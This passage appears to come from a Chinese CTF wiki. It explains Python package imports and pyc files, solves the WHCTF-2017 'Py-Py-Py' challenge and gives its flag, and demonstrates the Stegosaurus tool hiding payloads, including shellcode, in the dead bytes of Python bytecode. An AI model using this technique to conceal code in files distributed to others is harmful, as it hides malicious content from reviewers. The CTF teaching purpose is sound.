<p>\u5305\u5bfc\u5165\u7684\u8fc7\u7a0b\u548c\u6a21\u5757\u7684\u57fa\u672c\u4e00\u81f4\uff0c\u53ea\u662f\u5bfc\u5165\u5305\u7684\u65f6\u5019\u4f1a\u6267\u884c\u6b64\u5305\u76ee\u5f55\u4e0b\u7684 <code>__init__.py</code> \uff0c\u800c\u4e0d\u662f\u6a21\u5757\u91cc\u9762\u7684\u8bed\u53e5\u4e86\u3002\u53e6\u5916\uff0c\u5982\u679c\u53ea\u662f\u5355\u7eaf\u7684\u5bfc\u5165\u5305\uff0c\u800c\u5305\u7684 <code>__init__.py</code> \u4e2d\u53c8\u6ca1\u6709\u660e\u786e\u7684\u5176\u4ed6\u521d\u59cb\u5316\u64cd\u4f5c\uff0c\u90a3\u4e48\u6b64\u5305\u4e0b\u9762\u7684\u6a21\u5757\u662f\u4e0d\u4f1a\u81ea\u52a8\u5bfc\u5165\u7684\u3002</p> <p>\u5047\u8bbe\u6211\u4eec\u6709\u5982\u4e0b\u6587\u4ef6\u7ed3\u6784\uff1a</p> <pre><code>.\n\u2514\u2500\u2500 PA\n    \u251c\u2500\u2500 __init__.py\n    \u251c\u2500\u2500 PB1\n    \u2502\u00a0\u00a0 \u251c\u2500\u2500 __init__.py\n    \u2502\u00a0\u00a0 \u2514\u2500\u2500 pb1_m.py\n    \u251c\u2500\u2500 PB2\n    \u2502\u00a0\u00a0 \u251c\u2500\u2500 __init__.py\n    \u2502\u00a0\u00a0 \u2514\u2500\u2500 pb2_m.py\n    \u2514\u2500\u2500 wave.py\n</code></pre> <p></p> <p><code>wave.py</code> \uff0c <code>pb1_m.py</code> \uff0c <code>pb2_m.py</code> \u6587\u4ef6\u4e2d\u6211\u4eec\u5747\u5b9a\u4e49\u4e86\u5982\u4e0b\u51fd\u6570\uff1a</p> <pre><code>def getName():\n    pass\n</code></pre> <p><code>__init__.py</code> \u6587\u4ef6\u5185\u5bb9\u5747\u4e3a\u7a7a\u3002</p> <p>\u6211\u4eec\u65b0\u5efa\u4e00\u4e2a <code>test.py</code> \uff0c\u5185\u5bb9\u5982\u4e0b\uff1a</p> <pre><code>import sys\nimport PA.wave #1\nimport PA.PB1 #2\nimport PA.PB1.pb1_m as m1 #3\nimport PA.PB2.pb2_m #4\nPA.wave.getName() #5\nm1.getName() #6\nPA.PB2.pb2_m.getName() #7\n</code></pre> <p>\u6211\u4eec\u8fd0\u884c\u4ee5\u540e\uff0c\u53ef\u4ee5\u770b\u51fa\u662f\u6210\u529f\u6267\u884c\u6210\u529f\u4e86\uff0c\u6211\u4eec\u518d\u770b\u770b\u76ee\u5f55\u7ed3\u6784\uff1a</p> <pre><code>.\n\u251c\u2500\u2500 PA\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 __init__.py\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 __init__.pyc\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 PB1\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 __init__.py\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 __init__.pyc\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 pb1_m.py\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 pb1_m.pyc\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 PB2\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 __init__.py\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 __init__.pyc\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 pb2_m.py\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 pb2_m.pyc\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 wave.py\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 wave.pyc\n\u2514\u2500\u2500 test.py\n</code></pre> <p></p> <p>\u6211\u4eec\u6765\u5206\u6790\u4e00\u4e0b\u8fd9\u4e2a\u8fc7\u7a0b\uff1a</p> <ul> <li>\u5f53\u6267\u884c<code>#1</code> \u540e\uff0c <code>sys.modules</code> \u4f1a\u540c\u65f6\u5b58\u5728 <code>PA</code> \u3001 <code>PA.wave</code> \u4e24\u4e2a\u6a21\u5757\uff0c\u6b64\u65f6\u53ef\u4ee5\u8c03\u7528 <code>PA.wave</code> \u7684\u4efb\u4f55\u7c7b\u6216\u51fd\u6570\u4e86\u3002\u4f46\u4e0d\u80fd\u8c03\u7528 <code>PA.PB1(2)</code> \u4e0b\u7684\u4efb\u4f55\u6a21\u5757\u3002\u5f53\u524d <code>Local</code> \u4e2d\u6709\u4e86 <code>PA</code> \u540d\u5b57\u3002</li> <li>\u5f53\u6267\u884c <code>#2</code> \u540e\uff0c\u53ea\u662f\u5c06 <code>PA.PB1</code> \u8f7d\u5165\u5185\u5b58\uff0c <code>sys.modules</code> \u4e2d\u4f1a\u6709 <code>PA</code> \u3001 <code>PA.wave</code> \u3001 <code>PA.PB1</code> \u4e09\u4e2a\u6a21\u5757\uff0c\u4f46\u662f <code>PA.PB1</code> \u4e0b\u7684\u4efb\u4f55\u6a21\u5757\u90fd\u6ca1\u6709\u81ea\u52a8\u8f7d\u5165\u5185\u5b58\uff0c\u6b64\u65f6\u5982\u679c\u76f4\u63a5\u6267\u884c <code>PA.PB1.pb1_m.getName()</code> \u5219\u4f1a\u51fa\u9519\uff0c\u56e0\u4e3a <code>PA.PB1</code> \u4e2d\u5e76\u6ca1\u6709 <code>pb1_m</code> \u3002\u5f53\u524d <code>Local</code> \u4e2d\u8fd8\u662f\u53ea\u6709 <code>PA</code> \u540d\u5b57\uff0c\u5e76\u6ca1\u6709 <code>PA.PB1</code> \u540d\u5b57\u3002</li> <li>\u5f53\u6267\u884c <code>#3</code> \u540e\uff0c\u4f1a\u5c06 <code>PA.PB1</code> \u4e0b\u7684 <code>pb1_m</code> \u8f7d\u5165\u5185\u5b58\uff0c <code>sys.modules</code> \u4e2d\u4f1a\u6709 <code>PA</code> \u3001 <code>PA.wave</code> \u3001 <code>PA.PB1</code> \u3001 <code>PA.PB1.pb1_m</code> \u56db\u4e2a\u6a21\u5757\uff0c\u6b64\u65f6\u53ef\u4ee5\u6267\u884c <code>PA.PB1.pb1_m.getName()</code> \u4e86\u3002\u7531\u4e8e\u4f7f\u7528\u4e86 <code>as</code> \uff0c\u5f53\u524d <code>Local</code> \u4e2d\u9664\u4e86 <code>PA</code> \u540d\u5b57\uff0c\u53e6\u5916\u6dfb\u52a0\u4e86 <code>m1</code> \u4f5c\u4e3a <code>PA.PB1.pb1_m</code> \u7684\u522b\u540d\u3002</li> <li>\u5f53\u6267\u884c <code>#4</code> \u540e\uff0c\u4f1a\u5c06 <code>PA.PB2</code> \u3001 <code>PA.PB2.pb2_m</code> \u8f7d\u5165\u5185\u5b58\uff0c <code>sys.modules</code> \u4e2d\u4f1a\u6709 <code>PA</code> \u3001 <code>PA.wave</code> \u3001 <code>PA.PB1</code> \u3001 <code>PA.PB1.pb1_m</code> \u3001 <code>PA.PB2</code> \u3001 <code>PA.PB2.pb2_m</code> \u516d\u4e2a\u6a21\u5757\u3002\u5f53\u524d <code>Local</code> \u4e2d\u8fd8\u662f\u53ea\u6709 <code>PA</code> \u3001 <code>m1</code> \u3002</li> <li>\u4e0b\u9762\u7684 <code>#5</code> \uff0c<code>#6</code> \uff0c <code>#7</code> \u90fd\u662f\u53ef\u4ee5\u6b63\u786e\u8fd0\u884c\u7684\u3002</li> </ul> <p>\u6ce8\uff1a\u9700\u8981\u6ce8\u610f\u7684\u95ee\u9898\u662f\u5982\u679c <code>PA.PB2.pb2_m</code> \u60f3\u5bfc\u5165 <code>PA.PB1.pb1_m</code> \u3001 <code>PA.wave</code> \u662f\u53ef\u4ee5\u76f4\u63a5\u6210\u529f\u7684\u3002\u6700\u597d\u662f\u91c7\u7528\u660e\u786e\u7684\u5bfc\u5165\u8def\u5f84\uff0c\u5bf9\u4e8e <code>../..</code> \u76f8\u5bf9\u5bfc\u5165\u8def\u5f84\u8fd8\u662f\u4e0d\u63a8\u8350\u4f7f\u7528\u3002</p> <p>\u65e2\u7136\u6211\u4eec\u5df2\u7ecf\u77e5\u9053 <code>pyc</code> \u6587\u4ef6\u7684\u4ea7\u751f\uff0c\u518d\u56de\u5230\u90a3\u9053\u8d5b\u9898\uff0c\u6211\u4eec\u5c1d\u8bd5\u5c06 <code>pyc</code> \u6587\u4ef6\u53cd\u7f16\u8bd1\u56de <code>python</code> \u6e90\u7801\u3002\u6211\u4eec\u4f7f\u7528\u5728\u7ebf\u7684\u5f00\u6e90\u5de5\u5177\u8fdb\u884c\u5c1d\u8bd5\uff1a</p> <p></p> <p>\u90e8\u5206\u4ee3\u7801\u6ca1\u6709\u53cd\u7f16\u8bd1\u6210\u529f\uff1f\uff1f\uff1f\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u5206\u6790\u4e00\u4e0b\uff0c\u5927\u6982\u610f\u601d\u5c31\u662f\u8bfb\u53d6 <code>cipher.txt</code> \u90a3\u4e2a\u6587\u4ef6\uff0c\u5c06\u90a3\u4e2a\u6587\u4ef6\u5185\u5bb9\u662f\u901a\u8fc7 <code>base64</code> \u7f16\u7801\u7684\uff0c\u6211\u4eec\u7684\u76ee\u7684\u662f\u5c06\u6587\u4ef6\u5185\u5bb9\u89e3\u7801\uff0c\u7136\u540e\u53c8\u5df2\u77e5 <code>key</code> \uff0c\u901a\u8fc7 <code>encryt</code> \u51fd\u6570\u8fdb\u884c\u52a0\u5bc6\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u5c06\u4ee3\u7801\u8865\u5168\uff1a</p> <pre><code>def encryt(key, plain):\n    cipher = ''\n    for i in range(len(plain)):\n        cipher += chr(ord(key[i % len(key)]) ^ ord(plain[i]))\n\n    return cipher\n\n\ndef getPlainText():\n    plain = ''\n    with open('cipher.txt') as (f):\n        while True:\n            line = f.readline()\n            if line:\n                plain += line\n            else:\n                break\n\n    return plain.decode('base_64')\n\n\ndef main():\n    key = 'LordCasser'\n    plain = getPlainText()\n    cipher = encryt(key, plain)\n    with open('xxx.txt', 'w') as (f):\n        f.write(cipher)\n\n\nif __name__ == '__main__':\n    main()\n</code></pre> <p>\u7ed3\u679c\u5982\u4e0b\uff1a</p> <pre><code>YOU ARE FOOLED\nTHIS IS NOT THAT YOU WANT\nGO ON DUDE\nCATCH THAT STEGOSAURUS\n</code></pre> <p>\u63d0\u793a\u544a\u8bc9\u6211\u4eec\u7528 <code>STEGOSAURUS</code> \u5de5\u5177\u8fdb\u884c\u9690\u5199\u7684\uff0c\u6211\u4eec\u76f4\u63a5\u5c06\u9690\u85cf\u7684payload\u5206\u79bb\u51fa\u6765\u5373\u53ef\u3002</p> <pre><code>python3 stegosaurus.py -x QAQ.pyc\n</code></pre> <p></p> <p>\u6211\u4eec\u5f97\u5230\u4e86\u6700\u7ec8\u7684 <code>flag</code> \u4e3a\uff1a<code>flag{fin4lly_z3r0_d34d}</code></p> <p>\u65e2\u7136\u90fd\u8bf4\u5230\u8fd9\u4e2a\u4efd\u5b50\u4e0a\u4e86\uff0c\u6211\u4eec\u5c31\u6765\u5206\u6790\u4e00\u4e0b\u6211\u4eec\u662f\u5982\u4f55\u901a\u8fc7 <code>Stegosaurus</code> \u6765\u5d4c\u5165 <code>Payload</code> \u3002</p> <p>\u6211\u4eec\u4ecd\u7136\u4ee5\u4e0a\u9762\u8fd9\u4e2a\u4ee3\u7801\u4e3a\u4f8b\u5b50\uff0c\u6211\u4eec\u8bbe\u7f6e\u811a\u672c\u540d\u79f0\u4e3a <code>encode.py</code> \u3002</p> <p>\u7b2c\u4e00\u6b65\uff0c\u6211\u4eec\u4f7f\u7528 <code>Stegosaurus</code> \u6765\u67e5\u770b\u5728\u4e0d\u6539\u53d8\u6e90\u6587\u4ef6 <code>(Carrier)</code> \u5927\u5c0f\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u7684 <code>Payload</code> \u80fd\u643a\u5e26\u591a\u5c11\u5b57\u8282\u7684\u6570\u636e\uff1a</p> <pre><code>python3 -m stegosaurus encode.py -r\n</code></pre> <p></p> <p>\u73b0\u5728\uff0c\u6211\u4eec\u53ef\u4ee5\u5b89\u5168\u5730\u5d4c\u5165\u6700\u591a24\u4e2a\u5b57\u8282\u7684 <code>Payload</code> \u4e86\u3002\u5982\u679c\u4e0d\u60f3\u8986\u76d6\u6e90\u6587\u4ef6\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 <code>-s</code> \u53c2\u6570\u6765\u5355\u72ec\u751f\u6210\u4e00\u4e2a\u5d4c\u5165\u4e86 <code>Payload</code> \u7684 <code>py</code> \u6587\u4ef6\uff1a</p> <pre><code>python3 -m stegosaurus encode.py -s --payload \"flag{fin4lly_z3r0_d34d}\"\n</code></pre> <p></p> <p>\u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u7528 <code>ls</code> \u547d\u4ee4\u67e5\u770b\u78c1\u76d8\u76ee\u5f55\uff0c\u5d4c\u5165\u4e86 <code>Payload</code> \u7684\u6587\u4ef6( <code>carrier</code> \u6587\u4ef6)\u548c\u539f\u59cb\u7684\u5b57\u8282\u7801\u6587\u4ef6\u4e24\u8005\u5927\u5c0f\u662f\u5b8c\u5168\u76f8\u540c\u7684\uff1a</p> <p></p> <p>\u6ce8\uff1a\u5982\u679c\u6ca1\u6709\u4f7f\u7528 <code>-s</code> \u53c2\u6570\uff0c\u90a3\u4e48\u539f\u59cb\u7684\u5b57\u8282\u7801\u6587\u4ef6\u5c06\u4f1a\u88ab\u8986\u76d6\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5411 <code>Stegosaurus</code> \u4f20\u9012 <code>-x</code> \u53c2\u6570\u6765\u63d0\u53d6\u51fa <code>Payload</code> \uff1a</p> <pre><code>python3 -m stegosaurus __pycache__/encode.cpython-36-stegosaurus.pyc -x\n</code></pre> <p></p> <p>\u6211\u4eec\u6784\u9020\u7684 <code>Payload</code> \u4e0d\u4e00\u5b9a\u8981\u662f\u4e00\u4e2a <code>ASCII</code> \u5b57\u7b26\u4e32\uff0c <code>shellcode</code> \u4e5f\u662f\u53ef\u4ee5\u7684\uff1a</p> <p></p> <p>\u6211\u4eec\u91cd\u65b0\u7f16\u5199\u4e00\u4e2a <code>example.py</code> \u6a21\u5757\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>import sys\nimport os\nimport math\ndef add(a,b):\n    return int(a)+int(b)\ndef sum1(result):\n    return int(result)*3\n\ndef sum2(result):\n    return int(result)/3\n\ndef sum3(result):\n    return int(result)-3\n\ndef main():\n    a = 1\n    b = 2\n    result = add(a,b)\n    print(sum1(result))\n    print(sum2(result))\n    print(sum3(result))\n\nif __name__ == \"__main__\":\n    main()\n</code></pre> <p>\u6211\u4eec\u8ba9\u5b83\u643a\u5e26 <code>Payload</code> \u4e3a <code>flag_is_here</code>\u3002</p> <p> </p> <p>\u6211\u4eec\u53ef\u4ee5\u67e5\u770b\u5d4c\u5165 <code>Payload</code> \u4e4b\u524d\u548c\u4e4b\u540e\u7684 <code>Python</code> \u4ee3\u7801\u8fd0\u884c\u60c5\u51b5\uff1a</p> <p></p> <p>\u901a\u8fc7 <code>strings</code> \u67e5\u770b <code>Stegosaurus</code> \u5d4c\u5165\u4e86 <code>Payload</code> \u4e4b\u540e\u7684\u6587\u4ef6\u8f93\u51fa\u60c5\u51b5( <code>payload</code> \u5e76\u6ca1\u6709\u663e\u793a\u51fa\u6765)\uff1a</p> <p></p> <p>\u63a5\u4e0b\u6765\u4f7f\u7528 <code>Python</code> \u7684 <code>dis</code> \u6a21\u5757\u6765\u67e5\u770b <code>Stegosaurus</code> \u5d4c\u5165 <code>Payload</code> \u4e4b\u524d\u548c\u4e4b\u540e\u7684\u6587\u4ef6\u5b57\u8282\u7801\u53d8\u5316\u60c5\u51b5\uff1a</p> <p>\u5d4c\u5165payload\u4e4b\u524d\uff1a</p> <pre><code>#( 11/29/18@ 5:14\u4e0b\u5348 )( python@Sakura ):~/\u684c\u9762\npython3 -m dis example.py 1           0 LOAD_CONST               0 (0)\n2 LOAD_CONST               1 (None)\n4 IMPORT_NAME              0 (sys)\n6 STORE_NAME               0 (sys)\n\n2           8 LOAD_CONST               0 (0)\n10 LOAD_CONST               1 (None)\n12 IMPORT_NAME              1 (os)\n14 STORE_NAME               1 (os)\n\n3          16 LOAD_CONST               0 (0)\n18 LOAD_CONST               1 (None)\n20 IMPORT_NAME              2 (math)\n22 STORE_NAME               2 (math)\n\n4          24 LOAD_CONST               2 (&lt;code object add at 0x7f90479778a0, file \"example.py\", line 4&gt;)\n26 LOAD_CONST               3 ('add')\n28 MAKE_FUNCTION            0\n30 STORE_NAME               3 (add)\n\n6          32 LOAD_CONST               4 (&lt;code object sum1 at 0x7f9047977810, file \"example.py\", line 6&gt;)\n34 LOAD_CONST               5 ('sum1')\n36 MAKE_FUNCTION            0\n38 STORE_NAME               4 (sum1)\n\n9          40 LOAD_CONST               6 (&lt;code object sum2 at 0x7f9047977ae0, file \"example.py\", line 9&gt;)\n42 LOAD_CONST               7 ('sum2')\n44 MAKE_FUNCTION            0\n46 STORE_NAME               5 (sum2)\n\n12          48 LOAD_CONST               8 (&lt;code object sum3 at 0x7f9047977f60, file \"example.py\", line 12&gt;)\n50 LOAD_CONST               9 ('sum3')\n52 MAKE_FUNCTION            0\n54 STORE_NAME               6 (sum3)\n\n15          56 LOAD_CONST              10 (&lt;code object main at 0x7f904798c300, file \"example.py\", line 15&gt;)\n58 LOAD_CONST              11 ('main')\n60 MAKE_FUNCTION            0\n62 STORE_NAME               7 (main)\n\n23          64 LOAD_NAME                8 (__name__)\n66 LOAD_CONST              12 ('__main__')\n68 COMPARE_OP               2 (==)\n70 POP_JUMP_IF_FALSE       78\n\n24          72 LOAD_NAME                7 (main)\n74 CALL_FUNCTION            0\n76 POP_TOP\n        &gt;&gt;   78 LOAD_CONST               1 (None)\n80 RETURN_VALUE\n</code></pre> <p>\u5d4c\u5165 <code>payload</code> \u4e4b\u540e\uff1a</p> <pre><code>#( 11/29/18@ 5:31\u4e0b\u5348 )( python@Sakura ):~/\u684c\u9762\npython3 -m dis example.py                                 1           0 LOAD_CONST               0 (0)\n2 LOAD_CONST               1 (None)\n4 IMPORT_NAME              0 (sys)\n6 STORE_NAME               0 (sys)\n\n2           8 LOAD_CONST               0 (0)\n10 LOAD_CONST               1 (None)\n12 IMPORT_NAME              1 (os)\n14 STORE_NAME               1 (os)\n\n3          16 LOAD_CONST               0 (0)\n18 LOAD_CONST               1 (None)\n20 IMPORT_NAME              2 (math)\n22 STORE_NAME               2 (math)\n\n4          24 LOAD_CONST               2 (&lt;code object add at 0x7f146e7038a0, file \"example.py\", line 4&gt;)\n26 LOAD_CONST               3 ('add')\n28 MAKE_FUNCTION            0\n30 STORE_NAME               3 (add)\n\n6          32 LOAD_CONST               4 (&lt;code object sum1 at 0x7f146e703810, file \"example.py\", line 6&gt;)\n34 LOAD_CONST               5 ('sum1')\n36 MAKE_FUNCTION            0\n38 STORE_NAME               4 (sum1)\n\n9          40 LOAD_CONST               6 (&lt;code object sum2 at 0x7f146e703ae0, file \"example.py\", line 9&gt;)\n42 LOAD_CONST               7 ('sum2')\n44 MAKE_FUNCTION            0\n46 STORE_NAME               5 (sum2)\n\n12          48 LOAD_CONST               8 (&lt;code object sum3 at 0x7f146e703f60, file \"example.py\", line 12&gt;)\n50 LOAD_CONST               9 ('sum3')\n52 MAKE_FUNCTION            0\n54 STORE_NAME               6 (sum3)\n\n15          56 LOAD_CONST              10 (&lt;code object main at 0x7f146e718300, file \"example.py\", line 15&gt;)\n58 LOAD_CONST              11 ('main')\n60 MAKE_FUNCTION            0\n62 STORE_NAME               7 (main)\n\n23          64 LOAD_NAME                8 (__name__)\n66 LOAD_CONST              12 ('__main__')\n68 COMPARE_OP               2 (==)\n70 POP_JUMP_IF_FALSE       78\n\n24          72 LOAD_NAME                7 (main)\n74 CALL_FUNCTION            0\n76 POP_TOP\n        &gt;&gt;   78 LOAD_CONST               1 (None)\n80 RETURN_VALUE\n</code></pre> <p>\u6ce8\uff1a <code>Payload</code> \u7684\u53d1\u9001\u548c\u63a5\u53d7\u65b9\u6cd5\u5b8c\u5168\u53d6\u51b3\u4e8e\u7528\u6237\u4e2a\u4eba\u559c\u597d\uff0c <code>Stegosaurus</code> \u53ea\u63d0\u4f9b\u4e86\u4e00\u79cd\u5411 <code>Python</code> \u5b57\u8282\u7801\u6587\u4ef6\u5d4c\u5165\u6216\u63d0\u53d6 <code>Payload</code> \u7684\u65b9\u6cd5\u3002\u4f46\u662f\u4e3a\u4e86\u4fdd\u8bc1\u5d4c\u5165\u4e4b\u540e\u7684\u4ee3\u7801\u6587\u4ef6\u5927\u5c0f\u4e0d\u4f1a\u53d1\u751f\u53d8\u5316\uff0c\u56e0\u6b64 <code>Stegosaurus</code> \u6240\u652f\u6301\u5d4c\u5165\u7684 <code>Payload</code> \u5b57\u8282\u957f\u5ea6\u5341\u5206\u6709\u9650\u3002\u56e0\u6b64 \uff0c\u5982\u679c\u4f60\u9700\u8981\u5d4c\u5165\u4e00\u4e2a\u5f88\u5927\u7684 <code>Payload</code> \uff0c\u90a3\u4e48\u4f60\u53ef\u80fd\u8981\u5c06\u5176\u5206\u6563\u5b58\u50a8\u4e8e\u591a\u4e2a\u5b57\u8282\u7801\u6587\u4ef6\u4e2d\u4e86\u3002</p> <p>\u4e3a\u4e86\u5728\u4e0d\u6539\u53d8\u6e90\u6587\u4ef6\u5927\u5c0f\u7684\u60c5\u51b5\u4e0b\u5411\u5176\u5d4c\u5165 <code>Payload</code> \uff0c\u6211\u4eec\u9700\u8981\u8bc6\u522b\u51fa\u5b57\u8282\u7801\u4e2d\u7684\u65e0\u6548\u7a7a\u95f4( <code>Dead Zone</code> )\u3002\u8fd9\u91cc\u6240\u8c13\u7684\u65e0\u6548\u7a7a\u95f4\u6307\u7684\u662f\u90a3\u4e9b\u5373\u4f7f\u88ab\u4fee\u6539\u4e5f\u4e0d\u4f1a\u6539\u53d8\u539f <code>Python</code> \u811a\u672c\u6b63\u5e38\u884c\u4e3a\u7684\u90a3\u4e9b\u5b57\u8282\u6570\u636e\u3002</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u53ef\u4ee5\u8f7b\u800c\u6613\u4e3e\u5730\u627e\u51fa <code>Python3.6</code> \u4ee3\u7801\u4e2d\u7684\u65e0\u6548\u7a7a\u95f4\u3002 <code>Python</code> \u7684\u5f15\u7528\u89e3\u91ca\u5668 <code>CPython</code> \u6709\u4e24\u79cd\u7c7b\u578b\u7684\u64cd\u4f5c\u7801\uff1a\u5373\u65e0\u53c2\u6570\u7684\u548c\u6709\u53c2\u6570\u7684\u3002\u5728\u7248\u672c\u53f7\u4f4e\u4e8e <code>3.5</code> \u7684 <code>Python</code> \u7248\u672c\u4e2d\uff0c\u6839\u636e\u64cd\u4f5c\u7801\u662f\u5426\u5e26\u53c2\uff0c\u5b57\u8282\u7801\u4e2d\u7684\u64cd\u4f5c\u6307\u4ee4\u5c06\u9700\u8981\u5360\u7528 <code>1</code> \u4e2a\u5b57\u8282\u6216 <code>3</code> \u4e2a\u5b57\u8282\u3002\u5728 <code>Python3.6</code> \u4e2d\u5c31\u4e0d\u4e00\u6837\u4e86\uff0c <code>Python3.6</code> \u4e2d\u6240\u6709\u7684\u6307\u4ee4\u90fd\u5360\u7528 <code>2</code> \u4e2a\u5b57\u8282\uff0c\u5e76\u4f1a\u5c06\u65e0\u53c2\u6570\u6307\u4ee4\u7684\u7b2c\u4e8c\u4e2a\u5b57\u8282\u8bbe\u7f6e\u4e3a <code>0</code> \uff0c\u8fd9\u4e2a\u5b57\u8282\u5728\u5176\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u5c06\u4f1a\u88ab\u89e3\u91ca\u5668\u5ffd\u7565\u3002\u8fd9\u4e5f\u5c31\u610f\u5473\u7740\uff0c\u5bf9\u4e8e\u5b57\u8282\u7801\u4e2d\u6bcf\u4e00\u4e2a\u4e0d\u5e26\u53c2\u6570\u7684\u64cd\u4f5c\u6307\u4ee4\uff0c <code>Stegosaurus</code> \u90fd\u53ef\u4ee5\u5b89\u5168\u5730\u5d4c\u5165\u957f\u5ea6\u4e3a <code>1</code> \u4e2a\u5b57\u8282\u7684 <code>Payload</code> \u4ee3\u7801\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 <code>Stegosaurus</code> \u7684 <code>-vv</code> \u9009\u9879\u6765\u67e5\u770b <code>Payload</code> \u662f\u5982\u4f55\u5d4c\u5165\u5230\u8fd9\u4e9b\u65e0\u6548\u7a7a\u95f4\u4e4b\u4e2d\u7684\uff1a</p> <pre><code>#( 11/29/18@10:35\u4e0b\u5348 )( python@Sakura ):~/\u684c\u9762\npython3 -m stegosaurus example.py -s -p \"ABCDE\" -vv          2018-11-29 22:36:26,795 - stegosaurus - DEBUG - Validated args\n2018-11-29 22:36:26,797 - stegosaurus - INFO - Compiled example.py as __pycache__/example.cpython-36.pyc for use as carrier\n2018-11-29 22:36:26,797 - stegosaurus - DEBUG - Read header and bytecode from carrier\n2018-11-29 22:36:26,798 - stegosaurus - DEBUG - POP_TOP (0)\n2018-11-29 22:36:26,798 - stegosaurus - DEBUG - POP_TOP (0)\n2018-11-29 22:36:26,798 - stegosaurus - DEBUG - POP_TOP (0)\n2018-11-29 22:36:26,798 - stegosaurus - DEBUG - RETURN_VALUE (0)\n2018-11-29 22:36:26,798 - stegosaurus - DEBUG - BINARY_SUBTRACT (0)\n2018-11-29 22:36:26,798 - stegosaurus - DEBUG - RETURN_VALUE (0)\n2018-11-29 22:36:26,798 - stegosaurus - DEBUG - BINARY_TRUE_DIVIDE (0)\n2018-11-29 22:36:26,798 - stegosaurus - DEBUG - RETURN_VALUE (0)\n2018-11-29 22:36:26,798 - stegosaurus - DEBUG - BINARY_MULTIPLY (0)\n2018-11-29 22:36:26,798 - stegosaurus - DEBUG - RETURN_VALUE (0)\n2018-11-29 22:36:26,798 - stegosaurus - DEBUG - BINARY_ADD (0)\n2018-11-29 22:36:26,798 - stegosaurus - DEBUG - RETURN_VALUE (0)\n2018-11-29 22:36:26,798 - stegosaurus - DEBUG - POP_TOP (0)\n2018-11-29 22:36:26,798 - stegosaurus - DEBUG - RETURN_VALUE (0)\n2018-11-29 22:36:26,798 - stegosaurus - INFO - Found 14 bytes available for payload\nPayload embedded in carrier\n2018-11-29 22:36:26,799 - stegosaurus - DEBUG - POP_TOP (65) ----A\n2018-11-29 22:36:26,799 - stegosaurus - DEBUG - POP_TOP (66) ----B\n2018-11-29 22:36:26,799 - stegosaurus - DEBUG - POP_TOP (67) ----C\n2018-11-29 22:36:26,799 - stegosaurus - DEBUG - RETURN_VALUE (68) ----D\n2018-11-29 22:36:26,799 - stegosaurus - DEBUG - BINARY_SUBTRACT (69) ----E\n2018-11-29 22:36:26,799 - stegosaurus - DEBUG - RETURN_VALUE (0)\n2018-11-29 22:36:26,799 - stegosaurus - DEBUG - BINARY_TRUE_DIVIDE (0)\n2018-11-29 22:36:26,799 - stegosaurus - DEBUG - RETURN_VALUE (0)\n2018-11-29 22:36:26,799 - stegosaurus - DEBUG - BINARY_MULTIPLY (0)\n2018-11-29 22:36:26,799 - stegosaurus - DEBUG - RETURN_VALUE (0)\n2018-11-29 22:36:26,799 - stegosaurus - DEBUG - BINARY_ADD (0)\n2018-11-29 22:36:26,799 - stegosaurus - DEBUG - RETURN_VALUE (0)\n2018-11-29 22:36:26,799 - stegosaurus - DEBUG - POP_TOP (0)\n2018-11-29 22:36:26,799 - stegosaurus - DEBUG - RETURN_VALUE (0)\n2018-11-29 22:36:26,799 - stegosaurus - DEBUG - Creating new carrier file name for side-by-side install\n2018-11-29 22:36:26,799 - stegosaurus - INFO - Wrote carrier file as __pycache__/example.cpython-36-stegosaurus.pyc\n</code></pre> <p>Challenges: WHCTF-2017:Py-Py-Py</p>"},{"location":"misc/other/pyc/#_4","title":"\u53c2\u8003\u6587\u732e","text":"<ul> <li>https://github.com/AngelKitty/stegosaurus</li> <li>\u4e00\u79cd\u7528\u4e8e\u5728Python\u5b57\u8282\u7801\u4e2d\u5d4c\u5165Payload\u7684\u9690\u5199\u5de5\u5177 \u2013 Stegosaurus</li> </ul>"},{"location":"misc/picture/gif/","title":"GIF","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"misc/picture/gif/#_1","title":"\u6587\u4ef6\u7ed3\u6784","text":"<p>\u4e00\u4e2aGIF\u6587\u4ef6\u7684\u7ed3\u6784\u53ef\u5206\u4e3a</p> <ul> <li>\u6587\u4ef6\u5934\uff08File Header\uff09<ul> <li>GIF \u6587\u4ef6\u7f72\u540d\uff08Signature\uff09</li> <li>\u7248\u672c\u53f7\uff08Version\uff09</li> </ul> </li> <li>GIF \u6570\u636e\u6d41\uff08GIF Data Stream\uff09<ul> <li>\u63a7\u5236\u6807\u8bc6\u7b26</li> <li>\u56fe\u8c61\u5757\uff08Image Block\uff09</li> <li>\u5176\u4ed6\u7684\u4e00\u4e9b\u6269\u5c55\u5757</li> </ul> </li> <li>\u6587\u4ef6\u7ec8\u7ed3\u5668\uff08Trailer\uff09</li> </ul> <p>\u4e0b\u8868\u663e\u793a\u4e86\u4e00\u4e2a GIF 